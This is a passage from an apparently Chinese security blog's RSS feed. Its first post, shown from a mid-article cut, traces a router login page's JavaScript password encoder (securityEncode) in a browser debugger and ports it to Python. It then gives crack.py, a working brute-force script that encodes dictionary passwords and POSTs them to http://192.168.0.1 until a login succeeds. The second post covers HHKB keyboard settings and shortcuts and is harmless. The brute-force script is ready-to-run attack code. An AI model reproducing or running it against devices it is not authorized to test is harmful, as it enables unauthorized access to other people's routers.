                    a = a || window.event;
                    if (13 == a.keyCode) return h()
                };
                b.onclick = function () {
                    d.style.display = &quot;none&quot;
                };
                b.onblur = function () {
                    0 == this.value.length &amp;amp;&amp;amp; (d.style.display = &quot;inline&quot;)
                };
                b.onkeydown = function (a) {
                    setStyle(id(&quot;lgPwdNote&quot;), {
                        visibility: &quot;hidden&quot;
                    });
                    disInputTip($(&quot;#lgPwd ~ i.tip&quot;)[0], &quot;null&quot;)
                }
            })()
        }
        init();
        --------------end----------------
    e)输入密码为123456后点击如下图中的暂停js执行按钮后再点击确定按钮
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js4.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    f)上一步中的确定按钮点击完成后点击下图中的step into next function按钮,点了2下就点不动了,变成了灰色
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js5.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    g)继续点暂停js执行按钮后再点确定,然后一直点step into next function按钮,点了10几下突然出现local变量
    a:&quot;123456&quot;,这个正是在密码输入框输入的密码,这时js执行到function(a){return $.securityEncode(...)}这里,如下图:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js6.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    h)这时再点step out of current function按钮再点step into next function突然出现a为加密后的变量,如下图
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js7.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    i)说明关键的加密函数就是securityEncode,对应的局部代码为:
    ---------------------js----------------------
    securityEncode: function (a, b, c) {
                var e = &quot;&quot;,
                    f, g, h, k, l = 187,
                    n = 187;
                g = a.length;
                h = b.length;
                k = c.length;
                f = g &amp;gt; h ? g : h;
                for (var p = 0; p &amp;lt; f; p++) n = l = 187, p &amp;gt;= g ? n = b.charCodeAt(p) : p &amp;gt;= h ? l = a.charCodeAt(p) : (l = a.charCodeAt(p), n = b.charCodeAt(p)), e += c.charAt((l ^ n) % k);
                return e
            }, orgAuthPwd: function (a) {
                return $.securityEncode(&quot;RDpbLfCPsJZ7fiv&quot;,
                    a, &quot;yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW&quot;)
            }
    ---------------------js----------------------

    人工转成python代码如下:
    -----------------python----------------
    def securityEncode(a,b,c):
        e=&quot;&quot;
        f=g=h=k=l=187
        n=187
        g=len(a)
        h=len(b)
        k=len(c)
        if g&amp;gt;h:
            f=g
        else:
            f=h
        for p in range(0,f):
            n=l=187
            if p&amp;gt;=g:
                n=ord(b[p])
            else:
                if p&amp;gt;=h:
                    l=ord(a[p])
                else:
                    l=ord(a[p])
                    n=ord(b[p])
                e+=c[(l ^ n) % k]
        return e
    -----------------python----------------

    最后写出爆破脚本如下:

    ----------------crack.py----------------
    import re
    import time
    import sys
    from exp10it import post_requests
    def securityEncode(a,b,c):
        e=&quot;&quot;
        f=g=h=k=l=187
        n=187
        g=len(a)
        h=len(b)
        k=len(c)
        if g&amp;gt;h:
            f=g
        else:
            f=h
        for p in range(0,f):
            n=l=187
            if p&amp;gt;=g:
                n=ord(b[p])
            else:
                if p&amp;gt;=h:
                    l=ord(a[p])
                else:
                    l=ord(a[p])
                    n=ord(b[p])
                e+=c[(l ^ n) % k]
        return e
    def myEncode(a):
        result=securityEncode(&quot;RDpbLfCPsJZ7fiv&quot;,a, &quot;yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW&quot;)
        return result
    dict=&quot;/var/root/mypypi/dicts/pass.txt&quot;
    with open(dict,&quot;r+&quot;) as f:
        i=0
        for each in f:
            time.sleep(0.5)
            i+=1
            mypass=re.sub(r&quot;\s$&quot;,&quot;&quot;,each)
            mypass=myEncode(mypass)
            data={&quot;method&quot;:&quot;do&quot;,&quot;login&quot;:{&quot;password&quot;:&quot;%s&quot; % mypass}}
            #print(data)
            resp=post_requests(&quot;http://192.168.0.1&quot;,data,{}).text
            #print(dir(resp))
            #print(resp.text)
            sys.stdout.write(&quot;you tried:%d\r&quot; % i)
            sys.stdout.flush()
            if re.search(r&quot;error_code&quot;,resp):
                continue
            else:
                print(&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Congratulations!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)
                print(each)
                break
    ----------------crack.py----------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-attention&quot;&gt;0x02 Attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)这里有2个js转python的关键地方:
1.js中的charCodeAt转成python为ord函数,eg:
    b.charCodeAt(p)转成python为ord(b[p])
2.js中的charAt转成python为数组取下标,eg:
    c.charAt((l ^ n) % k)转成c[(l ^ n) % k]

b)也可直接由python执行js,可参考:google.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 24 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/05/24/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84http%E6%9A%B4%E7%A0%B4/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/05/24/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84http%E6%9A%B4%E7%A0%B4/</guid>
        
        <category>js</category>
        
        <category>crack</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>HHKB BT键盘设置</title>
        <description>&lt;h3 id=&quot;0x00-购买&quot;&gt;0x00 购买&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.购买hhkb bt最终采用办法为萌购代购(没有信用卡无法自己在日亚上海淘,如果用别人的信用卡购买会被日亚认为是存在安全
风险,需要发传真验证账户安全性,这是大坑)
2.最终购买HHKB BT+几个键帽与拨键帽器一共花费2105rmb
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-设置&quot;&gt;0x01 设置&lt;/h3&gt;

&lt;h4 id=&quot;0xa-测试环境&quot;&gt;0xa 测试环境&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;系统:macOS sierra
pc:imac
keyboard:HHKB BT(无刻版)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/hhkb.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;0xb-detail&quot;&gt;0xb Detail&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.背面的6个开关设置2,3,6为打开,其余全部关闭

2.HHKB BT不用安装键盘驱动,官网如下说法:
    &quot;HHKB Mac-only driver installation on the Professional BT does not need.&quot;

3.设置control键按下为control键,只按下一次为esc键(利于vim),原来的修饰键不变,在keyboard maestro中设置如下图即可(
与imac自带的键盘的设置有一点不同,imac自带键盘的设置还需将caps设置为ctrl,具体可见
http://3xp10it.cc/linux/2017/03/11/安装macOS-sierra要做的事/)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/hhkb-ctr2esc.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4.快捷键
    ctrl+a:到开头
    ctrl+e:到结尾
    ctrl+p:到开头
    ctrl+n:到结尾
    ctrl+b:左
    ctrl+f:右
    ctrl+w:向前删除一个单词
    ctrl+h:向前删除一个字符
    ctrl+d:向后删除一个字符
    ctrl+u:向前删除所有
    ctrl+k:向后删除所有
    control+t:将当前光标下的字符与前一个字符互换

    没有上下方向的快捷键,用keyboard maestro中设置的ctrl+command+j/k
        参考http://3xp10it.cc/linux/2017/03/11/安装macOS-sierra要做的事/
        方向用上面链接中的快捷键:
        command+control+hjkl

    以下只在终端有效
    ctrl+&amp;amp;:恢复被上面删除的内容
    ctrl+r:向前搜索运行过的命令
    ctrl+s:向后搜索运行过的命令
    ctrl+y:粘贴上面删除的内容
    ctrl+p:上一个命令
    ctrl+n:下一个命令

    最后系统下的所有快捷键更全版本见如下链接,本文只记录与hhkb相关的快捷键
        http://3xp10it.cc/linux/2017/03/11/安装macOS-sierra要做的事/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sat, 20 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/05/20/HHKB-BT%E9%94%AE%E7%9B%98%E8%AE%BE%E7%BD%AE/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/05/20/HHKB-BT%E9%94%AE%E7%9B%98%E8%AE%BE%E7%BD%AE/</guid>
        
        <category>HHKB</category>
        
        
        <category>auxilary</category>
        
      </item>
    
  </channel>
</rss>
